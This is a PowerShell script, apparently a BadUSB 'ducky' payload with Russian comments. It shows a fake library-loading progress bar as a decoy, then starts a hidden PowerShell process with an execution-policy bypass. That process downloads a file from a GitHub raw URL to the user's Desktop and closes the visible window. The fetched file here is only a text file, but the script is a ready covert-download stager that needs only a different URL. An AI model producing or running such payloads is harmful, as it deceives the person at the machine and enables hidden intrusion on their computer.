# 1. Имитация загрузки библиотек
$libs = @("System.Net.Http.dll", "Newtonsoft.Json.dll", "Discord.Net.Core.dll")
Write-Host "Инициализация среды..." -ForegroundColor DarkGray
Start-Sleep -Milliseconds 800

foreach ($lib in $libs) {
    Write-Host "Загрузка: $lib ..." -ForegroundColor Cyan -NoNewline
    for ($i = 0; $i -le 100; $i += 25) {
        Write-Host " [■■■□□] $i%" -ForegroundColor Yellow -NoNewline
        Start-Sleep -Milliseconds 150
        Write-Host "`r" -NoNewline
    }
    Write-Host " [■■■■■] 100% - OK" -ForegroundColor Green
}

Write-Host "`nЗапуск фоновой загрузки файла..." -ForegroundColor Magenta
Start-Sleep -Seconds 1

# 2. Фоновая загрузка. Мы запускаем отдельный скрытый процесс.
# Он скачает файл и потом откроет CMD на 3 секунды.
$dest = "$env:USERPROFILE\Desktop\downloaded_text.txt"
$url = "https://raw.githubusercontent.com/brotimofeenk-svg/ducky-payload/main/test.txt"

# Формируем команду для скрытого процесса
$bgCmd = @"
`$wc = New-Object System.Net.WebClient
`$wc.Headers.Add('User-Agent', 'Mozilla/5.0')
try { 
    `$wc.DownloadFile('$url', '$dest') 
} catch {}
Start-Process cmd -ArgumentList '/c', 'echo Файл успешно скачан! && timeout /t 3 >nul' -WindowStyle Normal
"@

# Запускаем фоновый процесс (он скрыт), а сами закрываем текущий PowerShell
Start-Process powershell -ArgumentList "-w hidden -ep bypass -c `"$bgCmd`"" -WindowStyle Hidden
exit
